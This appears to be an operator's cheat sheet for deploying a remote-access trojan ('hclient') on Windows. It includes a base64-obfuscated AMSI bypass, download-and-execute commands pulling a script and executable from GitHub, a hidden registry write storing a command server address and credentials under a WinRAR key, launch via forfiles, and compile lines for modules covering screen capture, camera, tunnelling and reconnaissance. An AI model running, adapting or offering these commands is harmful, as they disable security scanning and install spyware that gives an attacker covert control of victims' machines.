/*
Copyright (c) [2024] [F.B (Addict)]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
*/ 

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

 $onelineBase64Content = ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Invoke-WebRequest -Uri "https://github.com/addict4ever/SourceTools/raw/main/hclient/lol.ps1").Content))) -replace "`r`n", ""; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($onelineBase64Content))) 
 
Get-Content lol.ps1 | PowerShell.exe -noprofile -

Initialise Set-Up Credential Reg-Key:

$lol="JHVzZXIgPSAiY2xpZW50IgokcGFzcyA9ICJjbGllbnQiCiRzZWNyZXQgPSAiY2xpZW50IgokdXJsID0gImh0dHBzOi8vMTYuMTYuMTYuMTE0OjUwMDAiCiAKJGVuY29kZWRVc2VyID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHVzZXIpKQokZW5jb2RlZFBhc3MgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkcGFzcykpCiRlbmNvZGVkU2VjcmV0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHNlY3JldCkpCiRlbmNvZGVkVXJsID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHVybCkpCiAKJGtleVBhdGggPSAiSEtDVTpcU29mdHdhcmVcV2luUkFSXGhjbGllbnQiCiAKTmV3LUl0ZW0gLVBhdGggJGtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwKIApTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrZXlQYXRoIC1OYW1lICJ1c2VyIiAtVmFsdWUgJHVzZXIKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAka2V5UGF0aCAtTmFtZSAicGFzc3dvcmQiIC1WYWx1ZSAkcGFzcwpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrZXlQYXRoIC1OYW1lICJzZWNyZXQiIC1WYWx1ZSAkc2VjcmV0ClNldC1JdGVtUHJvcGVydHkgLVBhdGggJGtleVBhdGggLU5hbWUgIlVSTCIgLVZhbHVlICR1cmwK"; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($lol)))

Download And Start : 

$URL = "aHR0cHM6Ly9naXRodWIuY29tL2FkZGljdDRldmVyL1NvdXJjZVRvb2xzL3Jhdy9tYWluL0V4ZS9oY2xpZW50LmV4ZQ=="; $Path = "YzpcdGVtcFxsb2wzLmV4ZQ=="; Start-BitsTransfer -Source ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($URL))) -Destination ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Path))); forfiles /p c:\windows\system32 /m SearchIndexer.exe /c ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Path)))

REgister Boot :

Compile : 

cl /Fe:httptest.exe /I"C:\temp\hclient\include" /std:c++17 /EHsc user32.lib gdi32.lib httptest.cpp screencapture.cpp fileutils.cpp ctun.cpp camera.cpp reconwin.cpp /link /LIBPATH:"C:\temp\hclient\lib" libcurl.lib zlib.lib user32.lib gdi32.lib Ws2_32.lib Crypt32.lib Advapi32.lib ole32.lib strmiids.lib oleaut32.lib Netapi32.lib

cl /Fe:httptest.exe /I"C:\devs\client\SourceTools\hclient\include" /I"C:\vcpkg\installed\x64-windows-static\include" /std:c++17 /EHsc /arch:x64 user32.lib gdi32.lib libcurl.lib zlib.lib hclient.cpp screencapture.cpp fileutils.cpp ctun.cpp camera.cpp reconwin.cpp /link /LIBPATH:"C:\vcpkg\installed\x64-windows-static\lib" user32.lib gdi32.lib Ws2_32.lib Crypt32.lib Advapi32.lib ole32.lib strmiids.lib oleaut32.lib Netapi32.lib

cl /EHsc sshclientarg.cpp /I"C:\vcpkg\installed\x86-windows-static\include" /link /LIBPATH:"C:\vcpkg\installed\x86-windows-static\lib" ssh.lib libcrypto.lib Ws2_32.lib Crypt32.lib User32.lib Advapi32.lib Shell32.lib
